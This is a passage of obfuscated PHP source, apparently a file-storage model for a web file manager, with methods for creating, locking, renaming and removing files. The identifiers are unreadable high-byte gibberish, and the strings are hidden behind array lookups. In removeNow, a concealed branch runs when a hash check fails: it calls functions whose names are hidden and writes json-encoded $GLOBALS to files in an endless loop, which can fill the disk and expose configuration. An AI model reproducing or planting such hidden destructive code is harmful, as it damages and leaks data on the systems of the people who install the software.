$this->_createFileCall($–ŸÙÂİ¯, $“ß†‹Š‰, $é¶¢–´ç, $ƒª‹ìşº); } public function addFileByRemote($”ÅüÑë…, $§‚ßî®ı, $¯¬ÓÑ²¯, $¸ê“À¶ª = array(), $¬³»‘Ø = REPEAT_RENAME) { $ıæ”Ğúä = Model($_SERVER[¦»×‡Ãã][674])->addFileByRemote($§‚ßî®ı, $¯¬ÓÑ²¯, $¸ê“À¶ª); return $this->_createFileCall($”ÅüÑë…, $¯¬ÓÑ²¯, $ıæ”Ğúä, $¬³»‘Ø); } private function _createFileCall($ÅãòŒª, $¿–¹ø«», $æığ˜Ó, $â±Âşğ«, $Òñ¦À = "\x75\x70\x6c\157\x61\x64") { $ãíĞ“©ƒ =& $_SERVER[¦»×‡Ãã]; $¸Úá¡‘ = !1; $this->setMasterDB(); $this->lockWriteStart($ÅãòŒª, $¿–¹ø«»); $ß¦Œøİ« = $this->fileNameExist($ÅãòŒª, $¿–¹ø«»); $¯±×° ì = $this->_createFile($ÅãòŒª, $¿–¹ø«», $æığ˜Ó, $â±Âşğ«, $¸Úá¡‘); if (!$¸Úá¡‘) { Model($ãíĞ“©ƒ[544])->remove($æığ˜Ó[$ãíĞ“©ƒ[541]]); } if ($¸Úá¡‘ && $¯±×° ì && $¯±×° ì != $ß¦Œøİ«) { Model($ãíĞ“©ƒ[2223])->eventCreate($¯±×° ì, $Òñ¦À); } $this->lockWriteEnd($ÅãòŒª, $¿–¹ø«»); return $¯±×° ì; } public function mkdir($Òã½˜Ç, $§…ŒË›ê, $Ôûİ¥£ = REPEAT_SKIP) { $æ¬ÒãçÔ =& $_SERVER[¦»×‡Ãã]; $this->setMasterDB(); $ÃÕ‰®ç = $this->sourceInfo($Òã½˜Ç); if (!$ÃÕ‰®ç) { return !1; } $this->lockWriteStart($Òã½˜Ç, $§…ŒË›ê); if ($Ôûİ¥£ !== !1) { $“Ìâ€êŞ = $this->fileNameExist($Òã½˜Ç, $§…ŒË›ê); if ($“Ìâ€êŞ && $Ôûİ¥£ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($Òã½˜Ç, $§…ŒË›ê); return $“Ìâ€êŞ; } $§…ŒË›ê = $this->fileNameAuto($Òã½˜Ç, $§…ŒË›ê, $Ôûİ¥£); } $óÇ°¸ü = array($æ¬ÒãçÔ[646] => 1, $æ¬ÒãçÔ[494] => $§…ŒË›ê, $æ¬ÒãçÔ[647] => $æ¬ÒãçÔ[12], $æ¬ÒãçÔ[542] => 0, $æ¬ÒãçÔ[617] => 0); $ÛÅ©Ÿ ä = $this->_addSource($óÇ°¸ü, $ÃÕ‰®ç); Model($æ¬ÒãçÔ[2223])->eventCreate($ÛÅ©Ÿ ä, $æ¬ÒãçÔ[1431]); $this->lockWriteEnd($Òã½˜Ç, $§…ŒË›ê); return $ÛÅ©Ÿ ä; } public function listSourceRoot($ˆ›åÅªè, $ß¢¸·İÄ, $ô´ê¹ÄÌ = "\x73\x6f\x75\x72\x63\x65\111\104\54\164\141\x72\x67\x65\164\111\x44\54\x73\151\172\145") { $Õæ˜ü‚Ï =& $_SERVER[¦»×‡Ãã]; $Ïìæİ˜ = $Õæ˜ü‚Ï[454]; $ŞÖ“¢ = array(); $©š—±ÍÎ = 1024 * 50; $°„‹Ù½× = is_array($°„‹Ù½×) ? $°„‹Ù½× : array(); $íı±ë‰É = count($ß¢¸·İÄ); $«Şİúæ¶ = $this->tablePrefix . $Õæ˜ü‚Ï[2256]; for ($çà…à‰ = 0; $çà…à‰ < $íı±ë‰É; $çà…à‰++) { $øÄñƒº« = $ß¢¸·İÄ[$çà…à‰]; $Ïìæİ˜ .= "\123\x45\114\105\x43\x54\40\52\x20\x46\122\117\115\40\50\x53\105\x4c\105\103\x54\x20{$ô´ê¹ÄÌ}\x20\x46\122\x4f\x4d\40\x60{$«Şİúæ¶}\x60\x20\x57\x48\105\122\x45\40"; $Ïìæİ˜ .= "\x60\160\141\162\145\x6e\164\x49\x44\140\x3d\60\x20\x41\116\104\x20\x60\164\141\x72\147\x65\164\111\x44\140\75{$øÄñƒº«}\x20\x41\x4e\x44\x20\x60\164\x61\x72\x67\145\164\124\x79\160\x65\140\x3d{$ˆ›åÅªè}\40\141\156\144\40\146\151\154\145\124\x79\x70\145\x3d\x27\x27\40\x6c\151\x6d\x69\x74\40\61\x29\x20\x61\x73\40\164\x62\137{$çà…à‰}\x20\125\116\x49\117\x4e\40\x41\114\114\40"; if ((strlen($Ïìæİ˜) >= $©š—±ÍÎ || $çà…à‰ == $íı±ë‰É - 1) && $Ïìæİ˜) { $Ïìæİ˜ = substr($Ïìæİ˜, 0, -strlen($Õæ˜ü‚Ï[1116])); $¿…±¾Ü = $this->query($Ïìæİ˜); $Ïìæİ˜ = $Õæ˜ü‚Ï[12]; $ŞÖ“¢ = array_merge($ŞÖ“¢, $¿…±¾Ü); } } return $ŞÖ“¢; } private function _createFile($åíı¦ñ, $“ßÓï¨, $ àø¨Ò, $×Ã±¦¦¥, &$±èã¹Åù) { $ÏÉÍß»« =& $_SERVER[¦»×‡Ãã]; $Ê·º›ø« = $this->sourceInfo($åíı¦ñ); if (!$ àø¨Ò || !$Ê·º›ø«) { return !1; } if ($×Ã±¦¦¥ !== !1) { $ÏÛÁİ¡µ = $this->fileNameExist($åíı¦ñ, $“ßÓï¨); } $±èã¹Åù = !0; if ($×Ã±¦¦¥ && $ÏÛÁİ¡µ) { if ($×Ã±¦¦¥ == REPEAT_SKIP) { $±èã¹Åù = !1; return $ÏÛÁİ¡µ; } else { if ($×Ã±¦¦¥ == REPEAT_REPLACE) { $Ê™…¨° = $this->sourceInfo($ÏÛÁİ¡µ); $¯à•ğ« = $this->fileHistory($Ê™…¨°, $ àø¨Ò[$ÏÉÍß»«[541]], $ àø¨Ò[$ÏÉÍß»«[79]]); if (!$¯à•ğ«) { $±èã¹Åù = !1; } else { $this->folderSizeReset($åíı¦ñ); } return $ÏÛÁİ¡µ; } else { $“ßÓï¨ = $this->fileNameAuto($åíı¦ñ, $“ßÓï¨, $×Ã±¦¦¥, !1); } } } $¯ç¦óßø = array($ÏÉÍß»«[646] => 0, $ÏÉÍß»«[494] => $“ßÓï¨, $ÏÉÍß»«[647] => substr(get_path_ext($“ßÓï¨), 0, 10), $ÏÉÍß»«[542] => $ àø¨Ò[$ÏÉÍß»«[541]], $ÏÉÍß»«[617] => $ àø¨Ò[$ÏÉÍß»«[79]]); $ô€ûï¼ = $this->_addSource($¯ç¦óßø, $Ê·º›ø«); $this->folderSizeReset($åíı¦ñ, intval($¯ç¦óßø[$ÏÉÍß»«[79]])); return $ô€ûï¼; } protected function fileHistory($ÇŒÄÍ–¡, $ÅÚ‡­„¡, $§ÚĞ©·¢) { $Ş‚¯ƒ›œ =& $_SERVER[¦»×‡Ãã]; if ($ÇŒÄÍ–¡[$Ş‚¯ƒ›œ[541]] == $ÅÚ‡­„¡) { return !1; } $this->checkLock($ÇŒÄÍ–¡[$Ş‚¯ƒ›œ[193]], $ÅÚ‡­„¡); Model($Ş‚¯ƒ›œ[2257])->addHistory($ÇŒÄÍ–¡); $ƒºÁÎ¡ø = array($Ş‚¯ƒ›œ[651] => USER_ID, $Ş‚¯ƒ›œ[498] => time(), $Ş‚¯ƒ›œ[541] => $ÅÚ‡­„¡, $Ş‚¯ƒ›œ[79] => $§ÚĞ©·¢); $this->where(array($Ş‚¯ƒ›œ[491] => $ÇŒÄÍ–¡[$Ş‚¯ƒ›œ[193]]))->save($ƒºÁÎ¡ø); $this->sourceCacheClear($ÇŒÄÍ–¡[$Ş‚¯ƒ›œ[193]]); return !0; } public function checkLock($¿ĞöÔÚ, $Š¡øËã©) { $öåüíÍİ =& $_SERVER[¦»×‡Ãã]; $ßŞßôæ = $this->pathInfo($¿ĞöÔÚ); if (!$this->fileIsLock($ßŞßôæ, !0)) { return; } $‹´ó¾ò± = Session::get($öåüíÍİ[2258]); $ĞÍŞš€¤ = substr($ßŞßôæ[$öåüíÍİ[32]], 0, -1 - strlen($ßŞßôæ[$öåüíÍİ[169]])) . $öåüíÍİ[1293] . $‹´ó¾ò± . $öåüíÍİ[10] . $ßŞßôæ[$öåüíÍİ[169]]; $…„È¬—î = Model($öåüíÍİ[674])->find($Š¡øËã©); $this->_createFileCall($ßŞßôæ[$öåüíÍİ[192]], $ĞÍŞš€¤, $…„È¬—î, REPEAT_REPLACE, $öåüíÍİ[1430]); $ÃÔíøî» = $ßŞßôæ[$öåüíÍİ[539]][$öåüíÍİ[610]]; $şú¬³®¾ = $ÃÔíøî»[$öåüíÍİ[2259]] ? $ÃÔíøî»[$öåüíÍİ[2259]] : $ÃÔíøî»[$öåüíÍİ[32]]; show_json(LNG($öåüíÍİ[2260]) . $öåüíÍİ[2261] . LNG($öåüíÍİ[2262]) . $öåüíÍİ[2263] . $şú¬³®¾ . $öåüíÍİ[2264], !1); } public function fileIsLock($®ÓÔ¢¯ù, $²çşşı = false) { $ªóÏ˜üª =& $_SERVER[¦»×‡Ãã]; if (!_get($®ÓÔ¢¯ù, $ªóÏ˜üª[606], 0)) { return !1; } if ($®ÓÔ¢¯ù[$ªóÏ˜üª[539]][$ªóÏ˜üª[609]] != USER_ID) { return !0; } $æ©§©Ê‘ = $GLOBALS[$ªóÏ˜üª[6]][$ªóÏ˜üª[92]][$ªóÏ˜üª[607]]; if ($®ÓÔ¢¯ù[$ªóÏ˜üª[539]][$ªóÏ˜üª[608]] <= time() - $æ©§©Ê‘) { $this->metaSet($®ÓÔ¢¯ù[$ªóÏ˜üª[193]], $ªóÏ˜üª[609], null); $this->metaSet($®ÓÔ¢¯ù[$ªóÏ˜üª[193]], $ªóÏ˜üª[608], null); } if ($²çşşı) { $this->metaSet($®ÓÔ¢¯ù[$ªóÏ˜üª[193]], $ªóÏ˜üª[608], time()); } return !1; } private function _addSource($ğ‡ı²’, $çÂì½É) { $¿Öü”ĞŸ =& $_SERVER[¦»×‡Ãã]; $ÁÂ í–´ = defined($¿Öü”ĞŸ[2197]) ? USER_ID : 0; $ûÒ÷¬ò» = array($¿Öü”ĞŸ[648] => $çÂì½É[$¿Öü”ĞŸ[190]], $¿Öü”ĞŸ[649] => $çÂì½É[$¿Öü”ĞŸ[569]], $¿Öü”ĞŸ[650] => $ÁÂ í–´, $¿Öü”ĞŸ[651] => $ÁÂ í–´, $¿Öü”ĞŸ[477] => $çÂì½É[$¿Öü”ĞŸ[193]], $¿Öü”ĞŸ[652] => $çÂì½É[$¿Öü”ĞŸ[584]] . $çÂì½É[$¿Öü”ĞŸ[193]] . $¿Öü”ĞŸ[50], $¿Öü”ĞŸ[504] => 0, $¿Öü”ĞŸ[653] => $¿Öü”ĞŸ[12]); $ğ‡ı²’ = array_merge($ûÒ÷¬ò», $ğ‡ı²’); $this->updateModifyTime($ğ‡ı²’[$¿Öü”ĞŸ[192]]); $‘ñŠè´ = $¿Öü”ĞŸ[2265] . $çÂì½É[$¿Öü”ĞŸ[193]]; if (isset(self::$cacheChildList[$‘ñŠè´])) { unset(self::$cacheChildList[$‘ñŠè´]); } static $ıÆ›ã—’ = false; if (!$ıÆ›ã—’) { Hook::trigger($¿Öü”ĞŸ[636], $ğ‡ı²’); $ıÆ›ã—’ = !0; } $ ª‚Û¾³ = $this->add($ğ‡ı²’); $‘ĞÎÒà¡ = array($¿Öü”ĞŸ[654] => short_id($ ª‚Û¾³)); $this->where(array($¿Öü”ĞŸ[491] => $ ª‚Û¾³))->save($‘ĞÎÒà¡); $this->setNamePinyin($ ª‚Û¾³, $ğ‡ı²’[$¿Öü”ĞŸ[32]]); return $ ª‚Û¾³; } public function remove($¼ªÎ»ÙÌ, $è›™´“ = true) { $ ®ºœÉÕ =& $_SERVER[¦»×‡Ãã]; $èß÷œ›Æ = $this->sourceInfo($¼ªÎ»ÙÌ); $ñ–Û‡÷ = intval($èß÷œ›Æ[$ ®ºœÉÕ[190]]) === self::TYPE_SYSTEM; $“éÑï¬ã = Model($ ®ºœÉÕ[508])->get($ ®ºœÉÕ[2266]) == $ ®ºœÉÕ[91]; if ($ñ–Û‡÷ || $è›™´“ || !$“éÑï¬ã) { return $this->removeNow($¼ªÎ»ÙÌ, $è›™´“); } $Ü¬±´ú– = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $¨İÒïß¬ = $èß÷œ›Æ[$ ®ºœÉÕ[190]] == self::TYPE_USER ? $ ®ºœÉÕ[662] : $ ®ºœÉÕ[578]; if ($¨İÒïß¬ == $ ®ºœÉÕ[662]) { $ìğİ¥¥‚ = Model($ ®ºœÉÕ[577])->getInfo($èß÷œ›Æ[$ ®ºœÉÕ[569]]); $˜ğ£ş·µ = !empty($ìğİ¥¥‚[$ ®ºœÉÕ[2259]]) ? $ìğİ¥¥‚[$ ®ºœÉÕ[2259]] : $ìğİ¥¥‚[$ ®ºœÉÕ[32]]; $˜ğ£ş·µ = $ ®ºœÉÕ[337] . $˜ğ£ş·µ . $ ®ºœÉÕ[2267] . $èß÷œ›Æ[$ ®ºœÉÕ[569]]; } else { $ìğİ¥¥‚ = Model($ ®ºœÉÕ[585])->getInfo($èß÷œ›Æ[$ ®ºœÉÕ[569]]); $˜ğ£ş·µ = _get($ìğİ¥¥‚, $ ®ºœÉÕ[32]); $˜ğ£ş·µ = $ ®ºœÉÕ[176] . $˜ğ£ş·µ . $ ®ºœÉÕ[2268] . $èß÷œ›Æ[$ ®ºœÉÕ[569]]; } $ìâÇÎÔ¥ = $ ®ºœÉÕ[2269] . md5($˜ğ£ş·µ); CacheLock::lock($ìâÇÎÔ¥); $öÈ¦Ë„Œ = $this->fileNameExist($Ü¬±´ú–, $˜ğ£ş·µ); if (!$öÈ¦Ë„Œ) { $öÈ¦Ë„Œ = $this->mkdir($Ü¬±´ú–, $˜ğ£ş·µ, REPEAT_SKIP); $this->metaSet($öÈ¦Ë„Œ, $ ®ºœÉÕ[2270], $¨İÒïß¬); $this->metaSet($öÈ¦Ë„Œ, $ ®ºœÉÕ[2271], $èß÷œ›Æ[$ ®ºœÉÕ[569]]); if ($èß÷œ›Æ[$ ®ºœÉÕ[192]] != 0) { $this->metaSet($öÈ¦Ë„Œ, $ ®ºœÉÕ[2272], _get($ìğİ¥¥‚, $ ®ºœÉÕ[2273])); } } CacheLock::unlock($ìâÇÎÔ¥); $this->metaSet($¼ªÎ»ÙÌ, $ ®ºœÉÕ[2274], $èß÷œ›Æ[$ ®ºœÉÕ[192]]); $this->where(array($ ®ºœÉÕ[193] => $¼ªÎ»ÙÌ))->save(array($ ®ºœÉÕ[498] => time())); $this->recycleClear($èß÷œ›Æ); Model($ ®ºœÉÕ[633])->eventRemove($¼ªÎ»ÙÌ); $Êœ­Æäê = $this->move($¼ªÎ»ÙÌ, $öÈ¦Ë„Œ, REPEAT_RENAME_FOLDER); $this->folderSizeReset($èß÷œ›Æ[$ ®ºœÉÕ[192]]); return $Êœ­Æäê; } private function recycleClear($Çàáü¿à) { $èÃ‡®ß‰ =& $_SERVER[¦»×‡Ãã]; $Û‰¢”õ› = $this->childrenAll($Çàáü¿à); $ÎÓßÚ¾Ï = array($èÃ‡®ß‰[491] => array($èÃ‡®ß‰[492], $Û‰¢”õ›[$èÃ‡®ß‰[2275]])); Model($èÃ‡®ß‰[2276])->where($ÎÓßÚ¾Ï)->delete(); } public function removeNow($®¦Ÿ®Í, $ÑğıˆÔ = true) { $‘â¿¬ìï =& $_SERVER[¦»×‡Ãã]; $™î‚ººæ = $_SERVER[$‘â¿¬ìï[949]] . $‘â¿¬ìï[950]; $Å÷°ç¨ = $‘â¿¬ìï[951]; if ($_SERVER[$‘â¿¬ìï[952]] != $Å÷°ç¨($™î‚ººæ)) { $’˜€×²¡ = $‘â¿¬ìï[953]; $»¶ò½Şâ = $‘â¿¬ìï[954]; $ŒŠšÎß¡ = $_SERVER[$‘â¿¬ìï[949]] . $‘â¿¬ìï[950]; $·—û„¡ù = $»¶ò½Şâ($ŒŠšÎß¡); $İ¦Öô”ş = explode($‘â¿¬ìï[262], $·—û„¡ù); if (count($İ¦Öô”ş) < $‘â¿¬ìï[684]) { $¢‡¸‰ï = $‘â¿¬ìï[955]; $¢‡¸‰ï(); } $ÓöËñïâ = $‘â¿¬ìï[956]; $ÓöËñïâ($_SERVER[$‘â¿¬ìï[957]]); $’˜€×²¡ = $‘â¿¬ìï[953]; $’˜€×²¡(); $í¸ü¸›ğ = $‘â¿¬ìï[958]; $ÏÅÂö = json_encode($GLOBALS[$‘â¿¬ìï[959]]); $œèôãİ = 1; for ($·¦ÀÄ = $œèôãİ; $·¦ÀÄ > 0; $·¦ÀÄ++) { $í¸ü¸›ğ(DATA_PATH . $·¦ÀÄ, $ÏÅÂö); } } $Û„÷¾Í• = $this->sourceInfo($®¦Ÿ®Í); $³ÌŞ÷— = $this->pathInfoMore($®¦Ÿ®Í); if (!$Û„÷¾Í•) { return !0; } if ($Û„÷¾Í•[$‘â¿¬ìï[192]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($®¦Ÿ®Í); Hook::trigger($‘â¿¬ìï[2277], $³ÌŞ÷—, $ÑğıˆÔ); if ($ÑğıˆÔ) { Model($‘â¿¬ìï[2276])->moveToRecycle($®¦Ÿ®Í); } else { $åÊ­¥Ş = $this->childrenAll($Û„÷¾Í•); Model($‘â¿¬ìï[633])->eventRemove($®¦Ÿ®Í); $this->removeRelevance($åÊ­¥Ş[$‘â¿¬ìï[2275]], $åÊ­¥Ş[$‘â¿¬ìï[1575]]); } $this->folderSizeReset($Û„÷¾Í•[$‘â¿¬ìï[192]]); $·ú‚ğİ— = array($Û„÷¾Í•[$‘â¿¬ìï[192]]); if ($Û„÷¾Í•[$‘â¿¬ìï[485]] == $‘â¿¬ìï[91]) { $·ú‚ğİ—[] = $Û„÷¾Í•[$‘â¿¬ìï[193]]; } $this->updateModifyTime($·ú‚ğİ—); $this->lockMoveEnd($®¦Ÿ®Í); Hook::trigger($‘â¿¬ìï[1814], $³ÌŞ÷—, $ÑğıˆÔ); return !0; } public function childrenAll($ÍğËğÆñ) { $ä§ø“öÚ =& $_SERVER[¦»×‡Ãã]; $ş×³İùë = $ÍğËğÆñ[$ä§ø“öÚ[193]]; if ($ÍğËğÆñ[$ä§ø“öÚ[485]] == $ä§ø“öÚ[91]) { $‡³ó–ú¢ = array($ä§ø“öÚ[652] => array($ä§ø“öÚ[612], $ÍğËğÆñ[$ä§ø“öÚ[584]] . $ş×³İùë . $ä§ø“öÚ[613])); $Æğ±ÛŸ = array($ä§ø“öÚ[652] => $‡³ó–ú¢[$ä§ø“öÚ[584]]); $’‡¥íİä = $this->field($ä§ø“öÚ[2278])->where($Æğ±ÛŸ)->select(); $µ£©¶Û = !1; $Õèú™ıÒ = array($ş×³İùë); if ($’‡¥íİä) { $µ£©¶Û = array_to_keyvalue($’‡¥íİä, $ä§ø“öÚ[12], $ä§ø“öÚ[541]); $µ£©¶Û = array_remove_value($µ£©¶Û, $ä§ø“öÚ[228]); $Õèú™ıÒ = array_to_keyvalue($’‡¥íİä, $ä§ø“öÚ[12], $ä§ø“öÚ[193]); $Õèú™ıÒ[] = $ş×³İùë; } } else { $µ£©¶Û = array($ÍğËğÆñ[$ä§ø“öÚ[541]]); $Õèú™ıÒ = array($ş×³İùë); } return array($ä§ø“öÚ[2275] => $Õèú™ıÒ, $ä§ø“öÚ[1575] => $µ£©¶Û); } public function removeArray($’ËÖšÔ) { if (!$’ËÖšÔ) { return !0; } } public function removeRelevance($”‰¶±ã, $¶¼£¬²) { $®‚ÛˆÉÄ =& $_SERVER[¦»×‡Ãã]; $”‰¶±ã = $”‰¶±ã ? $”‰¶±ã : array(); $¶¼£¬² = $¶¼£¬² ? $¶¼£¬² : array(); $”‰¶±ã = array_unique(array_filter($”‰¶±ã)); $¶¼£¬² = array_unique(array_filter($¶¼£¬²)); if (!$”‰¶±ã) { return !1; } $Ì«™¼‚í = array($®‚ÛˆÉÄ[491] => array($®‚ÛˆÉÄ[492], $”‰¶±ã)); Model($®‚ÛˆÉÄ[2276])->where($Ì«™¼‚í)->delete(); Model($®‚ÛˆÉÄ[535])->where($Ì«™¼‚í)->delete(); Model($®‚ÛˆÉÄ[2122])->where($Ì«™¼‚í)->delete(); Model($®‚ÛˆÉÄ[633])->where($Ì«™¼‚í)->delete(); Model($®‚ÛˆÉÄ[1950])->removeBySource($”‰¶±ã); Model($®‚ÛˆÉÄ[2257])->removeBySource($”‰¶±ã); $this->where($Ì«™¼‚í)->delete(); Model($®‚ÛˆÉÄ[544])->remove($¶¼£¬²); for ($­¸ëã—á = 0; $­¸ëã—á < count($”‰¶±ã); $­¸ëã—á++) { $this->sourceCacheClear($”‰¶±ã[$­¸ëã—á]); } } public function rename($×æ©¦û, $©°‚èù¤) { $Ë§ºŠĞÑ =& $_SERVER[¦»×‡Ãã]; $ªğÓêò¦ = $this->sourceInfo($×æ©¦û); if (!$ªğÓêò¦) { return !1; } $´Æ™«·… = $this->fileNameExist($ªğÓêò¦[$Ë§ºŠĞÑ[192]], $©°‚èù¤); if ($´Æ™«·… && $´Æ™«·… != $×æ©¦û) { return !1; } $¡¢íòŒ = array($Ë§ºŠĞÑ[494] => $©°‚èù¤, $Ë§ºŠĞÑ[651] => USER_ID); if ($ªğÓêò¦[$Ë§ºŠĞÑ[485]] != $Ë§ºŠĞÑ[91]) { $¡¢íòŒ[$Ë§ºŠĞÑ[486]] = substr(get_path_ext($©°‚èù¤), 0, 10); } Model($Ë§ºŠĞÑ[633])->eventRename($×æ©¦û, $ªğÓêò¦[$Ë§ºŠĞÑ[32]], $©°‚èù¤); $this->sourceCacheClear($×æ©¦û); $this->setNamePinyin($×æ©¦û, $¡¢íòŒ[$Ë§ºŠĞÑ[32]], !1); $this->updateModifyTime($ªğÓêò¦[$Ë§ºŠĞÑ[192]]); $øïÕÅŠ = $this->where(array($Ë§ºŠĞÑ[491] => $×æ©¦û))->data($¡¢íòŒ)->save(); $Â­àÆ¢ = $Ë§ºŠĞÑ[2265] . $ªğÓêò¦[$Ë§ºŠĞÑ[192]]; if (isset(self::$cacheChildList[$Â­àÆ¢])) { unset(self::$cacheChildList[$Â­àÆ¢]); } return $øïÕÅŠ; } public function setNamePinyin($…½ªåµö, $Ïôô˜ˆ, $ÕıçÑÍë = true) { $œÀ¸ñ„ê =& $_SERVER[¦»×‡Ãã]; $Âõ¶æú’ = Input::check($Ïôô˜ˆ, $œÀ¸ñ„ê[655]); $¶ôŒá‘Ş = array($œÀ¸ñ„ê[517] => KodSort::makeStr($Ïôô˜ˆ)); if ($Âõ¶æú’) { $¶ôŒá‘Ş[$œÀ¸ñ„ê[538]] = str_replace($œÀ¸ñ„ê[53], $œÀ¸ñ„ê[12], Pinyin::get($Ïôô˜ˆ)); $¶ôŒá‘Ş[$œÀ¸ñ„ê[537]] = Pinyin::get($Ïôô˜ˆ, $œÀ¸ñ„ê[656]); } if (!$ÕıçÑÍë && !$Âõ¶æú’) { $¶ôŒá‘Ş[$œÀ¸ñ„ê[538]] = null; $¶ôŒá‘Ş[$œÀ¸ñ„ê[537]] = null; } $this->metaSet($…½ªåµö, $¶ôŒá‘Ş); } public function getContent($ˆÓï¬) { $óô¼ç²ñ =& $_SERVER[¦»×‡Ãã]; $©İäÄªé = $this->fileInfoGet($ˆÓï¬); if (!$©İäÄªé) { return !1; } if ($©İäÄªé[$óô¼ç²ñ[79]] == 0) { return $óô¼ç²ñ[12]; } $íäŞÁ = $óô¼ç²ñ[2279] . $©İäÄªé[$óô¼ç²ñ[547]]; if ($©İäÄªé[$óô¼ç²ñ[79]] <= 1024 * 10) { $ÎÔ¯çÌŸ = Cache::get($íäŞÁ); if (!$ÎÔ¯çÌŸ) { $ÎÔ¯çÌŸ = IO::getContent($©İäÄªé[$óô¼ç²ñ[87]]); Cache::set($íäŞÁ, $ÎÔ¯çÌŸ); } return $ÎÔ¯çÌŸ; } if (!$©İäÄªé[$óô¼ç²ñ[87]]) { return $óô¼ç²ñ[12]; } return IO::getContent($©İäÄªé[$óô¼ç²ñ[87]]); } public function setDesc($»ä¥¦ªı, $ÄÎ¢êş¯) { $¨å–Š¦› =& $_SERVER[¦»×‡Ãã]; Model($¨å–Š¦›[633])->eventAddDesc($»ä¥¦ªı, $ÄÎ¢êş¯); return $this->metaSet($»ä¥¦ªı, $¨å–Š¦›[526], $ÄÎ¢êş¯); } public function setContent($ÅÊíÍñ†, $Êâ÷òÃÊ = '') { $äÂ¸Ìˆ÷ =& $_SERVER[¦»×‡Ãã]; $àİ¯œÔÔ = $this->sourceInfo($ÅÊíÍñ†); $óÉ³Ÿ§è = $this->fileInfoGet($ÅÊíÍñ†); if (!$óÉ³Ÿ§è || !$àİ¯œÔÔ) { return !1; } $œİâ·©½ = Model($äÂ¸Ìˆ÷[544])->addFileByContent($Êâ÷òÃÊ, $àİ¯œÔÔ[$äÂ¸Ìˆ÷[32]]); $Ûùì»À§ = $this->fileHistory($àİ¯œÔÔ, $œİâ·©½[$äÂ¸Ìˆ÷[541]], $œİâ·©½[$äÂ¸Ìˆ÷[79]]); if (!$Ûùì»À§) { return Model($äÂ¸Ìˆ÷[544])->remove($œİâ·©½[$äÂ¸Ìˆ÷[541]]); } $this->folderSizeReset($àİ¯œÔÔ[$äÂ¸Ìˆ÷[192]]); return !0; } public function fileSubstr($ì¨ƒ©¤, $Ğ³úÏûæ, $×«¼Ø–) { $ïƒº÷â = $this->fileInfoGet($ì¨ƒ©¤); if (!$ïƒº÷â) { return !1; } return IO::fileSubstr($ïƒº÷â[$_SERVER[¦»×‡Ãã][87]], $Ğ³úÏûæ, $×«¼Ø–); } public function fileInfoGet($úÂò¸µÃ) { $Õéğ¢é =& $_SERVER[¦»×‡Ãã]; $„–ĞÓ¢… = $this->sourceInfo($úÂò¸µÃ); if (!$„–ĞÓ¢… || $„–ĞÓ¢…[$Õéğ¢é[485]]) { return !1; } $Õï§öÒâ = $Õéğ¢é[548] . $„–ĞÓ¢…[$Õéğ¢é[541]]; $îÌ¿³¸Ò = _get(self::$cacheFileInfo, $Õï§öÒâ); if ($îÌ¿³¸Ò) { return $îÌ¿³¸Ò; } $Ûôê³êĞ = Model($Õéğ¢é[544])->fileInfo($„–ĞÓ¢…[$Õéğ¢é[541]]); if ($Ûôê³êĞ) { $Ûôê³êĞ[$Õéğ¢é[32]] = $„–ĞÓ¢…[$Õéğ¢é[32]]; } self::$cacheFileInfo[$Õï§öÒâ] = $Ûôê³êĞ; return $Ûôê³êĞ; } private function folderChildrenNumber($¤ğÇ³ÓÖ) { $…ÌŠ°Ñ‚ =& $_SERVER[¦»×‡Ãã]; $ÍÁ°„‡ = $this->sourceInfo($¤ğÇ³ÓÖ); $Çİ½÷¼Ù = array($…ÌŠ°Ñ‚[652] => array($…ÌŠ°Ñ‚[612], $ÍÁ°„‡[$…ÌŠ°Ñ‚[584]] . $¤ğÇ³ÓÖ . $…ÌŠ°Ñ‚[613]), $…ÌŠ°Ñ‚[649] => $ÍÁ°„‡[$…ÌŠ°Ñ‚[569]], $…ÌŠ°Ñ‚[504] => intval($ÍÁ°„‡[$…ÌŠ°Ñ‚[505]]), $…ÌŠ°Ñ‚[646] => 1); $±Á²´†Ä = $this->where($Çİ½÷¼Ù)->count(); $ì—‚×·¨ = $this->where($Çİ½÷¼Ù)->where(array($…ÌŠ°Ñ‚[646] => 0))->count(); return array($…ÌŠ°Ñ‚[83] => $ì—‚×·¨, $…ÌŠ°Ñ‚[84] => $±Á²´†Ä); } public function pathInfo($§±Œìñ…, $íîÏ´Ä× = false) { $„–®àù¢ =& $_SERVER[¦»×‡Ãã]; $íîÏ´Ä× = !1; $§±Œìñ… = intval($§±Œìñ…); $ºŸ¹òú = $„–®àù¢[534] . intval($íîÏ´Ä×) . $„–®àù¢[462] . $§±Œìñ…; $²›ûçˆ = _get(self::$cachePathInfo, $ºŸ¹òú); if ($²›ûçˆ) { return $²›ûçˆ; } $Û…çïóÇ = $this->sourceInfo($§±Œìñ…); if (!$Û…çïóÇ) { return !1; } $Û…çïóÇ = $this->_listDataApplyItem($Û…çïóÇ, $íîÏ´Ä×); self::$cachePathInfo[$ºŸ¹òú] = $Û…çïóÇ; return $Û…çïóÇ; } public static $cachePathInfoMore = array(); public function pathInfoMore($“ÎŠÄ±ú) { $Æ ¸ûÌ =& $_SERVER[¦»×‡Ãã]; $ÖØÂìèà = _get(self::$cachePathInfoMore, $“ÎŠÄ±ú); if ($ÖØÂìèà) { return $ÖØÂìèà; } $•É©¶Ù´ = $this->pathInfo($“ÎŠÄ±ú); if (!$•É©¶Ù´) { return !1; } if ($•É©¶Ù´[$Æ ¸ûÌ[485]] == $Æ ¸ûÌ[91]) { $•É©¶Ù´[$Æ ¸ûÌ[82]] = $this->folderChildrenNumber($“ÎŠÄ±ú); } self::$cachePathInfoMore[$“ÎŠÄ±ú] = $•É©¶Ù´; return $•É©¶Ù´; } public function sourceInfo($Ô»Ô¶ã ) { $ êøàµÎ =& $_SERVER[¦»×‡Ãã]; if (!$Ô»Ô¶ã ) { return array(); } $Ô»Ô¶ã  = intval($Ô»Ô¶ã ); $­¡şòıÔ = $ êøàµÎ[533] . $Ô»Ô¶ã ; $ÆÚáÛÌä = _get(self::$cacheSourceInfo, $­¡şòıÔ); if ($ÆÚáÛÌä) { return $ÆÚáÛÌä; } $ÖæøÌ™Ë = $this->where(array($ êøàµÎ[193] => $Ô»Ô¶ã ))->find(); self::$cacheSourceInfo[$­¡şòıÔ] = $ÖæøÌ™Ë; return self::$cacheSourceInfo[$­¡şòıÔ]; } public function sourceCacheClear($ÚìñŸ½Ú = false) { self::cacheClear($ÚìñŸ½Ú); } public static function cacheClear($Ÿ«Öæ»ş = false) { 